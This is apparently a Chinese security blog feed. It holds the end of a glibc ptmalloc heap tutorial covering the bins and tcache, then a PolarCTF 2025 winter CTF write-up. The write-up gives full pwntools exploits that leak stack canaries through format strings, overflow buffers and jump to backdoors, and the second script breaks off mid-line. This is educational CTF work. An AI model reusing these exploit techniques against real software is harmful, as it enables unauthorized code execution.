class="line">| unsigned int binmap[2] (bits 64-95)   |</span><br><span class="line">| unsigned int binmap[3] (bits 96-127)  |</span><br><span class="line">|---------------------------------------|</span><br><span class="line">| struct malloc_state *next (arena 链)  |  下一个 arena</span><br><span class="line">| struct malloc_state *next_free        |  空闲 arena 链</span><br><span class="line">| INTERNAL_SIZE_T attached_threads      |  关联线程数</span><br><span class="line">| INTERNAL_SIZE_T system_mem            |  系统内存总量</span><br><span class="line">| INTERNAL_SIZE_T max_system_mem        |  历史峰值</span><br><span class="line">+---------------------------------------+</span><br></pre></td></tr></table></figure><p>源码如下，可以对照着上面的结构图看：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct malloc_state</span><br><span class="line">&#123;</span><br><span class="line">  /* Serialize access.  */</span><br><span class="line">  __libc_lock_define (, mutex);</span><br><span class="line"></span><br><span class="line">  /* Flags (formerly in max_fast).  */</span><br><span class="line">  int flags;</span><br><span class="line"></span><br><span class="line">  /* Set if the fastbin chunks contain recently inserted free blocks.  */</span><br><span class="line">  /* Note this is a bool but not all targets support atomics on booleans.  */</span><br><span class="line">  int have_fastchunks;</span><br><span class="line"></span><br><span class="line">  /* Fastbins */</span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"></span><br><span class="line">  /* Base of the topmost chunk -- not otherwise kept in a bin */</span><br><span class="line">  mchunkptr top;</span><br><span class="line"></span><br><span class="line">  /* The remainder from the most recent split of a small request */</span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line"></span><br><span class="line">  /* Normal bins packed as described above */</span><br><span class="line">  mchunkptr bins[NBINS * 2 - 2];</span><br><span class="line"></span><br><span class="line">  /* Bitmap of bins */</span><br><span class="line">  unsigned int binmap[BINMAPSIZE];</span><br><span class="line"></span><br><span class="line">  /* Linked list */</span><br><span class="line">  struct malloc_state *next;</span><br><span class="line"></span><br><span class="line">  /* Linked list for free arenas.  Access to this field is serialized</span><br><span class="line">     by free_list_lock in arena.c.  */</span><br><span class="line">  struct malloc_state *next_free;</span><br><span class="line"></span><br><span class="line">  /* Number of threads attached to this arena.  0 if the arena is on</span><br><span class="line">     the free list.  Access to this field is serialized by</span><br><span class="line">     free_list_lock in arena.c.  */</span><br><span class="line">  INTERNAL_SIZE_T attached_threads;</span><br><span class="line"></span><br><span class="line">  /* Memory allocated from the system in this arena.  */</span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure><h3 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h3><p>fast bin是ptmalloc中用于管理小内存块的一种数据结构。fastbin最多可以支持的bin的个数为10个（<strong>大小0x20至0x80</strong>），采用<strong>单链表+LIFO</strong>的管理策略，也就是说，fast bin在管理free chunk时，那些chunk只会用到fd指针，而且其不会合并相邻的空闲chunk（P位始终为1）。</p><p>下面就用代码+调试的方式来更好的理解fast bin的相关机制：</p><ol><li><p>先用代码看一下fast bin的定义与chunk在fast bin中是什么样的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//define fast bins</span><br><span class="line">#define NFASTBINS  10</span><br><span class="line">typedef struct malloc_chunk* mfastbinptr;</span><br><span class="line">struct malloc_state</span><br><span class="line">&#123;</span><br><span class="line">    // ...</span><br><span class="line">    mfastbinptr fastbins[NFASTBINS];</span><br><span class="line">    // ...</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">//chunk in the fast bin</span><br><span class="line">struct malloc_chunk</span><br><span class="line">&#123;</span><br><span class="line">    size_t      prev_size;</span><br><span class="line">    size_t      size;</span><br><span class="line">    struct malloc_chunk *fd;</span><br><span class="line">    // 数据区域...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>由此可以看出fast bin其实是一个包含10个元素数组，每一个元素是一个指向chunk的单向链表头。</p></li><li><p>关于LIFO的机制，其实和栈差不多。一开始fast bin没有管理任何一个chunk</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fastbins[0]: NULL</span><br></pre></td></tr></table></figure><p>当我们free了一个chunk1时，就类似于push操作</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fastbins[0]: chunk1 → NULL</span><br></pre></td></tr></table></figure><p>再free一个chunk2</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fastbins[0]: chunk2 → chunk1 → NULL</span><br></pre></td></tr></table></figure><p>此时，我们申请一个大小合适的chunk，因为chunk2比chunk1后进入到fast bin中，其LIFO机制使得再申请一个大小合适的chunk时，就类似于pop操作，将chunk2弹出</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fastbins[0]: chunk1 → NULL</span><br></pre></td></tr></table></figure></li><li><p>为更直观感受fast bin的机制，下面就编写一段代码进行调试来理解一下。（由于我是在高版本下进行的，因此需要先将tcache填满，才能用到fast bin，因此在这里就不展示完整的代码了）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char *ptr1 = malloc(0x30);</span><br><span class="line">char *ptr2 = malloc(0x30);</span><br><span class="line">char *ptr3 = malloc(0x30);</span><br><span class="line"></span><br><span class="line">memset(ptr1, &#x27;A&#x27;, 0x30);</span><br><span class="line">memset(ptr2, &#x27;B&#x27;, 0x30);</span><br><span class="line">memset(ptr3, &#x27;C&#x27;, 0x30);</span><br></pre></td></tr></table></figure><p><img src="/images/heap_study_2.png"></p><p>至于为什么ptr1的地址会比ptr2的地址高，是因为在高版本中有tcache的存在。tcache也是LIFO的管理机制，我先申请多个chunk再free掉，从而将tcache填满，由于ptr1比ptr2后申请到，ptr1的地址会比ptr2高，ptr2又比ptr1先free掉，所以ptr1比ptr2后进入到tcache中，因此再申请大小合适的chunk时，ptr1会比ptr2先出tcache。这就是为什么ptr1的地址比ptr2的高。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">free(ptr1);</span><br><span class="line">free(ptr2);</span><br><span class="line">free(ptr3);</span><br></pre></td></tr></table></figure><p><img src="/images/heap_study_3.png"></p><p>此时可以看到每一个free chunk的fd都指向的是chunk header。接着再次申请chunk</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char *new_ptr1 = malloc(0x20);</span><br><span class="line">printf(&quot;new_ptr1 = %p\n&quot;, new_ptr1);</span><br><span class="line">char *new_ptr2 = malloc(0x20);</span><br><span class="line">printf(&quot;new_ptr2 = %p\n&quot;, new_ptr2);</span><br><span class="line">char *new_ptr3 = malloc(0x20);</span><br><span class="line">printf(&quot;new_ptr3 = %p\n&quot;, new_ptr3);</span><br><span class="line">printf(&quot;LIFO 验证: new_ptr1 %s ptr3\n&quot;,(new_ptr1 == ptr3) ? &quot;==&quot; : &quot;!=&quot;);</span><br></pre></td></tr></table></figure><p><img src="/images/heap_study_4.png"></p><p>此时可以看到新申请到的new_ptr1的地址与后free掉的ptr3的地址是一样的，这也就说明了fast bin的LIFO机制</p></li></ol><h3 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h3><p>small bin是ptmalloc中用于管理中小内存块的一种数据结构，采用<strong>双链表+FIFO</strong>管理策略，每一个small bin链表的chunk大小是一样的，各small bin链表间的chunk是不一样的（和fast bin是一样的），与fast bin不一样的是会检查并<strong>合并物理相邻的空闲chunk</strong>。在<strong>32位</strong>中大小是<strong>0x10至0x1F8</strong>，在<strong>64位</strong>中大小是<strong>0x20至0x3F0</strong>。</p><p>其结构大致如下，可以看出small bin有62个：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">|------------------------------------------|</span><br><span class="line">| bins[2]   -&gt; small bin 1 fd (size=0x20)  |  Bin 2: Small #1 (最小)</span><br><span class="line">| bins[3]   -&gt; small bin 1 bk              |</span><br><span class="line">| bins[4]   -&gt; small bin 2 fd (size=0x30)  |  Bin 3</span><br><span class="line">| bins[5]   -&gt; small bin 2 bk              |</span><br><span class="line">| ...                                      |</span><br><span class="line">| bins[124] -&gt; small bin 62 fd (size=0x3f0)|  Bin 63: Small #62 (最大)</span><br><span class="line">| bins[125] -&gt; small bin 62 bk             |</span><br><span class="line">|------------------------------------------|</span><br></pre></td></tr></table></figure><p>在每一个small bin里面，各chunk大致如下（其中fd指向下一个free chunk，bk指向上一个free chunk）：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+-------------+      +-------------+      +-------------+</span><br><span class="line">|   chunk A   |      |   chunk B   |      |   chunk C   |</span><br><span class="line">|             |      |             |      |             |</span><br><span class="line">|  +-------+  |      |  +-------+  |      |  +-------+  |</span><br><span class="line">|  |  fd   |  |-----&gt;|  |  fd   |  |-----&gt;|  |  fd   |  |</span><br><span class="line">|  +-------+  |      |  +-------+  |      |  +-------+  |</span><br><span class="line">|  |  bk   |  |&lt;-----|  |  bk   |  |&lt;-----|  |  bk   |  |</span><br><span class="line">|  +-------+  |      |  +-------+  |      |  +-------+  |</span><br><span class="line">|  | size  |  |      |  | size  |  |      |  | size  |  |</span><br><span class="line">|  +-------+  |      |  +-------+  |      |  +-------+  |</span><br><span class="line">+-------------+      +-------------+      +-------------+</span><br></pre></td></tr></table></figure><p>接下来用代码+调试，进一步理解一下small bin的相关机制</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">void demonstrate_small_bin() &#123;</span><br><span class="line">    const size_t SIZE = 256;  // 使用 256 字节，避开 fast bin (&gt;128)</span><br><span class="line">    const int TCACHE_COUNT = 7;</span><br><span class="line"></span><br><span class="line">    // 1. 分配 9 个块</span><br><span class="line">    void* ptrs[TCACHE_COUNT + 2];</span><br><span class="line">    printf(&quot;1. 分配 %d 个 %zu 字节的块\n&quot;, TCACHE_COUNT + 2, SIZE);</span><br><span class="line">    for (int i = 0; i &lt; TCACHE_COUNT + 2; i++) &#123;</span><br><span class="line">        ptrs[i] = malloc(SIZE);</span><br><span class="line">        printf(&quot;   ptr[%d] = %p\n&quot;, i, ptrs[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 2. 全部释放：前 7 个进 tcache，后 2 个进small bin</span><br><span class="line">    printf(&quot;\n2. 全部释放：前 %d 个进 tcache，后 2 个进 *真正的* small bin\n&quot;, TCACHE_COUNT);</span><br><span class="line">    for (int i = 0; i &lt; TCACHE_COUNT + 2; i++) &#123;</span><br><span class="line">        free(ptrs[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 3. 先掏空 tcache</span><br><span class="line">    printf(&quot;\n3. 分配 %d 个块（从 tcache 取出，LIFO）\n&quot;, TCACHE_COUNT);</span><br><span class="line">    for (int i = 0; i &lt; TCACHE_COUNT; i++) &#123;</span><br><span class="line">        void* p = malloc(SIZE);</span><br><span class="line">        printf(&quot;   tcache[%d] = %p\n&quot;, i, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 4. 现在分配的才是 small bin（FIFO）</span><br><span class="line">    printf(&quot;\n4. 再分配 2 个块（从small bin取出，FIFO）\n&quot;);</span><br><span class="line">    void* s1 = malloc(SIZE);  // 应该拿到 ptr[7]（先释放的）</span><br><span class="line">    void* s2 = malloc(SIZE);  // 应该拿到 ptr[8]（后释放的）</span><br><span class="line"></span><br><span class="line">    printf(&quot;   s1 = %p (ptr[7] = %p, %s)\n&quot;, s1, ptrs[7], (s1 == ptrs[7]) ? &quot;✓ FIFO&quot; : &quot;✗&quot;);</span><br><span class="line">    printf(&quot;   s2 = %p (ptr[8] = %p, %s)\n&quot;, s2, ptrs[8], (s2 == ptrs[8]) ? &quot;✓ FIFO&quot; : &quot;✗&quot;);</span><br><span class="line">    printf(&quot;   FIFO 验证：先释放的 ptr[7] 应该先被分配出来\n&quot;);</span><br><span class="line"></span><br><span class="line">    free(s1);</span><br><span class="line">    free(s2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    demonstrate_small_bin();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/heap_study_5.png"></p><p>这可以清晰的看出<strong>small bin</strong>是<strong>FIFO</strong>，<strong>tcache</strong>是<strong>LIFO</strong>。但是在调试的过程中发现，由于unsorted bin的存在，使用heapinfo或bins都无法直接看出是否有small bin的参与，所以这里就不展示相应的图片了。</p><h3 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h3><p>large bin是ptmalloc中用于管理较大内存块的一个结构，很多方面和small bin差不多，不同的是，在同一个large bin中，<strong>chunk的大小可能不一样</strong>，正因为同一个large bin中各chunk间的大小可能不同，所以large bin会多用到两个指针——fd_nextsize与bk_nextsize，其中<strong>fd_nextsize</strong>指向<strong>下一个更小size</strong>的chunk，<strong>bk_nextsize</strong>指向<strong>上一个更大size</strong>的chunk，同样大小的chunk用fd&#x2F;bk指针完成链表的操作。其大致如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌─────────────────────────────┐</span><br><span class="line">│  Chunk A (size: 0x500)      │</span><br><span class="line">│  [第一个0x500大小]           │</span><br><span class="line">│                             │</span><br><span class="line">│  fd_nextsize ───────────────┼─────────────────────┐</span><br><span class="line">│  bk_nextsize = NULL         │                     │</span><br><span class="line">└─────────────────────────────┘                     │</span><br><span class="line">                                                    │</span><br><span class="line">┌─────────────────────────────┐                     │</span><br><span class="line">│  Chunk B (size: 0x500)      │                     │</span><br><span class="line">│  [第二个0x500大小]           │                     │</span><br><span class="line">│                             │                     │</span><br><span class="line">│  fd_nextsize = NULL         │  ←─ 后续同size为NULL │</span><br><span class="line">│  bk_nextsize = NULL         │                     │</span><br><span class="line">└─────────────────────────────┘                     │</span><br><span class="line">                                                    │</span><br><span class="line">┌─────────────────────────────┐                     │</span><br><span class="line">│  Chunk C (size: 0x480)      │ ◄───────────────────┘</span><br><span class="line">│  [第一个0x480大小]           │</span><br><span class="line">│                             │</span><br><span class="line">│  fd_nextsize ───────────────┼─────────────────────┐</span><br><span class="line">│  bk_nextsize 指向 Chunk A    │                     │</span><br><span class="line">└─────────────────────────────┘                     │</span><br><span class="line">                                                    │</span><br><span class="line">┌─────────────────────────────┐                     │</span><br><span class="line">│  Chunk D (size: 0x460)      │ ◄───────────────────┘</span><br><span class="line">│  [第一个0x460大小]           │</span><br><span class="line">│                             │</span><br><span class="line">│  fd_nextsize = NULL (或指向bin头)│</span><br><span class="line">│  bk_nextsize 指向 Chunk C   │</span><br><span class="line">└─────────────────────────────┘</span><br></pre></td></tr></table></figure><p>large bin的结构大致如下，可以看出large bin有63个：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">|---------------------------------------|</span><br><span class="line">| bins[126] -&gt; large bin 1 fd           |  Bin 64: Large #1</span><br><span class="line">| bins[127] -&gt; large bin 1 bk           |</span><br><span class="line">| ...                                   |</span><br><span class="line">| bins[250] -&gt; large bin 63 fd          |  Bin 126: Large #63</span><br><span class="line">| bins[251] -&gt; large bin 63 bk          |</span><br><span class="line">|---------------------------------------|</span><br></pre></td></tr></table></figure><p>因为large bin和small bin在一些方面大差不差的，具体的调试过程在这就不再过多的赘述了。</p><h3 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h3><p>unsorted bin是ptmalloc中暂存刚被free掉的中等大小的chunk的<strong>单一双向循环链表</strong>，遵循FIFO原则，避免每次释放都立即将chunk插入到对应的bin中，减小操作开销，而且还可以为合并相邻free chunk提供时间。从其命名就可以看出，unsorted bin管理的chunk的大小并不固定，可以存放任何尺寸的chunk（除fast bin大小外），整个进程只有一个unsorted bin。</p><p>其结构大致如下，可以看出unsorted bin只有一个：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">|---------------------------------------|</span><br><span class="line">| bins[0]   -&gt; unsorted bin fd          |  Bin 1: Unsorted (索引0)</span><br><span class="line">| bins[1]   -&gt; unsorted bin bk          |</span><br><span class="line">|---------------------------------------|</span><br></pre></td></tr></table></figure><p>chunk在unsorted bin里面的结构大致如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+-------------+-------------+</span><br><span class="line">| prev_size   | size (P=0)  |  &lt;- header</span><br><span class="line">+-------------+-------------+</span><br><span class="line">| fd          | bk          |</span><br><span class="line">+-------------+-------------+</span><br><span class="line">|           data            |</span><br><span class="line">+-------------+-------------+</span><br></pre></td></tr></table></figure><h3 id="tcache"><a href="#tcache" class="headerlink" title="tcache"></a>tcache</h3><p>tcache是在<strong>glibc2.26</strong>以后引入的线程本地缓存机制，专门为小内存的malloc&#x2F;free而设计的，每一个线程都有属于自己的tcache，存储在thread_local中。和fast bin一样都是<strong>LIFO+单链表</strong>的管理策略且立即合并两个相邻的free chunk，每一个tcache_bin可以存放<strong>7个chunk</strong>。free时会优先将chunk存入到tcache中。tcache引入了两个新的结构体<strong>tcache_entry</strong>（缓存条目）和<strong>tcache_perthread_struct</strong>（线程本地结构体）。</p><p>tcache_entry的定义如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">typedef struct tcache_entry &#123;</span><br><span class="line">    struct tcache_entry *next;  // 指向下一个空闲块</span><br><span class="line">    uintptr_t key;              // 安全密钥，防止 double free</span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure><p>其用于链接free chunk，<strong>next指针</strong>指向下一个大小相同的<strong>chunk的user_data</strong>，这一点和fast bin不一样，fd是指向chunk header，而且tcache_entry会复用free chunk的user data部分。<strong>key</strong>用于检测double free攻击，key指向tcache_perthread_struct，若同一个chunk再次放入tcache中，就会检测key 。同样和fd&#x2F;bk一样，只有chunk处于free状态时，next&#x2F;key才会使用。</p><p>tcache_perthread_struct的定义如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># define TCACHE_MAX_BINS                64</span><br><span class="line">static __thread tcache_perthread_struct *tcache = NULL;</span><br><span class="line"></span><br><span class="line">typedef struct tcache_perthread_struct &#123;</span><br><span class="line">    char counts[TCACHE_MAX_BINS];      // 每个 bin 的当前可用数量</span><br><span class="line">    tcache_entry *entries[TCACHE_MAX_BINS];  // 指向各 bin 的链表头</span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure><p>由此我们可以看出每一个tcache中有<strong>64个tcache_bin</strong>，同一个tcache_bin存放的free chunk的大小是一样的，不同tcache_bin存放不同size的free chunk。<strong>entries</strong>用单向链表链接大小相同的<strong>free chunk</strong>，counts记录free chunk的数目。</p><p>其结构与chunk在tcache_bin时的结构大致如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌─────────────────────────────────────────────────────────────┐</span><br><span class="line">│               TLS (Thread Local Storage)                    │</span><br><span class="line">│                                                             │</span><br><span class="line">│  static __thread tcache_perthread_struct *tcache = NULL;    │</span><br><span class="line">│                                                             │</span><br><span class="line">└─────────────────────────────────────────────────────────────┘</span><br><span class="line">                            │</span><br><span class="line">                            ▼</span><br><span class="line">        ┌─────────────────────────────────────────┐</span><br><span class="line">        │   tcache_perthread_struct (heap)        │</span><br><span class="line">        ├─────────────────────────────────────────┤</span><br><span class="line">        │  malloc chunk header (prev_size, size)  │</span><br><span class="line">        ├─────────────────────────────────────────┤</span><br><span class="line">        │  uint16_t    counts[TCACHE_MAX_BINS];   │</span><br><span class="line">        │  tcache_entry* entries[TCACHE_MAX_BINS];│</span><br><span class="line">        └────────────────────┬────────────────────┘</span><br><span class="line">                             │</span><br><span class="line">        ┌────────────────────┼────────────────────┐</span><br><span class="line">        │                    │                    │</span><br><span class="line">        ▼                    ▼                    ▼</span><br><span class="line">   ┌──────────┐       ┌─────────────┐      ┌─────────────┐</span><br><span class="line">   │ counts[0]│       │ entries[0]  │──┐   │ entries[63] │ = NULL</span><br><span class="line">   │ counts[1]│       │             │  │   │             │</span><br><span class="line">   │   ...    │       └─────────────┘  │   └─────────────┘</span><br><span class="line">   │counts[63]│                        │</span><br><span class="line">   └──────────┘                        │</span><br><span class="line">                                       ▼</span><br><span class="line">                            ┌───────────────────────┐</span><br><span class="line">                            │  malloc_chunk (空闲块) │</span><br><span class="line">                            ├───────────────────────┤</span><br><span class="line">                            │ prev_size             │</span><br><span class="line">                            ├───────────────────────┤</span><br><span class="line">                            │ size (with flags)     │</span><br><span class="line">                            ├───────────────────────┤</span><br><span class="line">                            │  tcache_entry         │</span><br><span class="line">                            │  ┌─────────────────┐  │</span><br><span class="line">                            │  │ next------------├--|--►next free chunk </span><br><span class="line">                            │  │ key ------------├--|--►tcache_perthread_struct</span><br><span class="line">                            │  └─────────────────┘  │</span><br><span class="line">                            │     ...(user_data)... │</span><br><span class="line">                            └───────────────────────┘</span><br></pre></td></tr></table></figure><p>对于ptmalloc中各个bin的介绍大致就是这样，具体攻击手法在后续文章会详细介绍。</p>]]></content>
      
      
      <categories>
          
          <category> heap </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PolarCTF2025冬季赛</title>
      <link href="/2025/12/09/PolarCTF2025%E5%86%AC%E5%AD%A3%E8%B5%9B/"/>
      <url>/2025/12/09/PolarCTF2025%E5%86%AC%E5%AD%A3%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h1 id="choice"><a href="#choice" class="headerlink" title="choice"></a>choice</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>一道64位开了canary保护的题目，存在一个格式化字符串漏洞函数与栈溢出函数，还有一个后门函数，因此是一个简单的题目。</p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p><img src="/images/PolarCTF_2025%E5%86%AC%E5%AD%A3%E8%B5%9B_choice_1.png"></p><p>存在格式化字符串漏洞，可以用来泄漏canary的值，使用gdb调试加上fmtarg算出偏移是多少</p><p><img src="/images/PolarCTF_2025%E5%86%AC%E5%AD%A3%E8%B5%9B_choice_2.png"></p><p>该题还存在存在栈溢出和后门函数，因此直接打即可</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from LibcSearcher import*</span><br><span class="line">from ctypes import*</span><br><span class="line">from struct import*</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;, terminal=[&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;])</span><br><span class="line"></span><br><span class="line">pwn_file=&#x27;./choice&#x27;</span><br><span class="line">#libc_file=&#x27;./libc.so.6&#x27;</span><br><span class="line">elf=ELF(pwn_file)</span><br><span class="line">#libc=ELF(libc_file)</span><br><span class="line"></span><br><span class="line">flag=0</span><br><span class="line">if flag:</span><br><span class="line">    io=process(pwn_file)</span><br><span class="line">else:</span><br><span class="line">    ip=&#x27;1.95.7.68&#x27;</span><br><span class="line">    port=2134</span><br><span class="line">    io=remote(ip,port)</span><br><span class="line"></span><br><span class="line">s = lambda data : io.send(data)</span><br><span class="line">sa = lambda delim,data : io.sendafter(str(delim), data)</span><br><span class="line">sl = lambda data : io.sendline(data)</span><br><span class="line">sla = lambda delim,data : io.sendlineafter(str(delim), data)</span><br><span class="line">r = lambda num : io.recv(num)</span><br><span class="line">rl=lambda : io.recvline()</span><br><span class="line">ru = lambda delims, drop = True : io.recvuntil(delims, drop)</span><br><span class="line">leak = lambda name,addr : log.success(&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;.format(name, addr))</span><br><span class="line">ur32 = lambda data: u32(io.recv(data).rjust(4,b&#x27;\x00&#x27;))</span><br><span class="line">ur64 = lambda data : u64(io.recv(data).rjust(8,b&#x27;\x00&#x27;))</span><br><span class="line">ul32    =   lambda data                 : u32(io.recv(data).ljust(4,b&#x27;\x00&#x27;))</span><br><span class="line">ul64    =   lambda data                 : u64(io.recv(data).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">uul32 = lambda : u32(io.recvuntil(b&#x27;\xf7&#x27;)[-4:].ljust(4,b&#x27;\x00&#x27;))</span><br><span class="line">uul64 = lambda : u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">i32=lambda data: int(io.recv(data), 16)</span><br><span class="line">i64=lambda data: int(io.recv(data), 16)</span><br><span class="line">lbp     =   lambda addr                 : addr-libc.sym[&#x27;puts&#x27;]</span><br><span class="line"></span><br><span class="line">ret=0x0400671</span><br><span class="line">backdoor=0x040095B</span><br><span class="line"></span><br><span class="line">sl(b&quot;2&quot;)</span><br><span class="line">sl(b&quot;%25$p&quot;)</span><br><span class="line">ru(b&quot;0x&quot;)</span><br><span class="line">canary=i64(16)</span><br><span class="line">leak(&quot;canary&quot;,canary)</span><br><span class="line"></span><br><span class="line">sl(b&quot;1&quot;)</span><br><span class="line">p1=cyclic(0xA0-8)+p64(canary)+p64(0)+p64(backdoor)</span><br><span class="line">sl(p1)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="bllhl-pie"><a href="#bllhl-pie" class="headerlink" title="bllhl_pie"></a>bllhl_pie</h1><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>32位开启了canary与pie保护的题目</p><p><img src="/images/PolarCTF_2025%E5%86%AC%E5%AD%A3%E8%B5%9B_bllhl_pie_1.png"></p><p>存在格式化字符串漏洞与栈溢出</p><p><img src="/images/PolarCTF_2025%E5%86%AC%E5%AD%A3%E8%B5%9B_bllhl_pie_2.png"></p><p>存在后门函数，但是有判断条件</p><h2 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h2><p>题目程序很简单，可以通过格式化字符串漏洞泄漏canary与基址。由于限制了溢出长度，因此我们只能将返回地址改为后门函数，通过格式化字符串漏洞分两次将hh的值改为1029。</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from LibcSearcher import*</span><br><span class="line">from ctypes import*</span><br><span class="line">from struct import*</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">#context(arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;)#, log_level=&#x27;debug&#x27;, terminal=[&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;])</span><br><span class="line"></span><br><span class="line">pwn_file=&#x27;./bllhl_pie&#x27;</span><br><span class="line">#libc_file=&#x27;./libc.so.6&#x27;</span><br><span class="line">elf=ELF(pwn_file)</span><br><span class="line">#libc=ELF(libc_file)</span><br><span class="line"></span><br><span class="line">flag=0</span><br><span class="line">if flag:</span><br><span class="line">    io=process(pwn_file)</span><br><span class="line">else:</span><br><span class="line">    ip=&#x27;1.95.36.136&#x27;</span><br><span class="line">    port=2065</span><br><span class="line">    io=remote(ip,port)</span><br><span class="line"></span><br><span class="line">s = lambda data : io.send(data)</span><br><span class="line">sa = lambda delim,data : io.sendafter(str(delim), data)</span><br><span class="line">sl = lambda data : io.sendline(data)</span><br><span class="line">sla = lambda delim,data : io.sendlineafter(str(delim), data)</span><br><span class="line">r = lambda num : io.recv(num)</span><br><span class="line">rl=lambda : io.recvline()</span><br><span class="line">ru = lambda delims, drop = True : io.recvuntil(delims, drop)</span><br><span class="line">leak = lambda name,addr : log.success(&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;.format(name, addr))</span><br><span class="line">ur32 = lambda data: u32(io.recv(data).rjust(4,b&#x27;\x00&#x27;))</span><br><span class="line">ur64 = lambda data : u64(io.recv(data).rjust(8,b&#x27;\x00&#x27;))</span><br><span class="line">ul32    =   lambda data                 : u32(io.recv(data).ljust(4,b&#x27;\x00&#x27;))</span><br><span class="line">ul64    =   lambda data                 : u64(io.recv(data).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">uul32 = lambda : u32(io.recvuntil(b&#x27;\xf7&#x27;)[-4:].ljust(4,b&#x27;\x00&#x27;))</span><br><span class="line">uul64 = lambda : u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">i32=lambda data: int(io.recv(data), 16)</span><br><span class="line">i64=lambda data: int(io.recv(data), 16)</span><br><span class="line">lbp     =   lambda addr                 : addr-libc.sym[&#x27;puts&#x27;]</span><br><span class="line"></span><br><span class="line">ru(b&quot;Could the challenger leave your name!!!\n&quot;)</span><br><span class="line">sl(b&quot;%15$p+%19$p&quot;)</span><br><span class="line">ru(b&quot;0x&quot;)</span><br><span class="line">canary=i32(8)</span><br><span class="line">ru(b&quot;+0x&quot;)</span><br><span class="line">base_addr=i32(8)-0x900</span><br><span class="line">leak(&quot;canary&quot;,canary)</span><br><span class="line">leak(&quot;base_addr&quot;,base_addr)</span><br><span class="line">hh=base_addr+0x200C</span><br><span class="line">input_addr=base_addr+0x843</span><br><span class="line">getshell=base_addr+0x7EA</span><br><span class="line"></span><br><span class="line">#gdb.attach(io)</span><br><span class="line"></span><br><span class="line">p1=p32(canary)*0xc+p32(input_addr)</span><br><span class="line">s(p1)</span><br><span class="line"></span><br><span class="line">ru(b&quot;Could the challenger leave your name!!!\n&quot;)</span><br><span class="line">p2=p32(hh)+b&quot;a&quot;+b&quot;%7$hhn&quot;</span><br><span class="line">sl(p2)</span><br><span class="line"></span><br><span class="line">s(p1)</span><br><span class="line"></span><br><span class="line">ru(b&quot;Could the challenger leave your name!!!\n&quot;)</span><br><span 